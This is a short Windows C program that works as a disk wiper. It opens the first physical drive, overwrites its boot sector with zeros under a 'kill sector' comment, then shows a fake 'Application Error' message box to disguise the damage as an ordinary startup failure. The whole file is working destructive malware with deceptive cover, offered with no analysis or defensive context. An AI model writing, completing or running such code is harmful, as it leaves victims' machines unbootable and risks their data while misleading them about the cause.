#include <windows.h>
#include <tchar.h>
int main() {
    //kill sector
    HANDLE hDevice = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return 1;
    }

    LARGE_INTEGER li;
    li.QuadPart = 0;

    SetFilePointerEx(hDevice, li, NULL, FILE_BEGIN);

    BYTE bootSector[512];

    for (int i = 0; i < 512; i++) {
        bootSector[i] = 0;
    }

    DWORD dwBytesWritten;
    WriteFile(hDevice, bootSector, 512, &dwBytesWritten, NULL);

    CloseHandle(hDevice);
    //msgbox
    TCHAR buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    LPCTSTR executableName = _tcsrchr(buffer, _T('\\'));
    if (executableName != NULL) {
        executableName++;
    }
    else {
        executableName = buffer;
    }
    TCHAR title[MAX_PATH + 20];
    _stprintf_s(title, _T("%s - Application Error"), executableName);
    MessageBox(
        NULL,
        _T("The application was unable to start correctly (0x0000007b). Click OK to close the application."),
        title,
        MB_ICONERROR | MB_OK
    );

    return 1;
}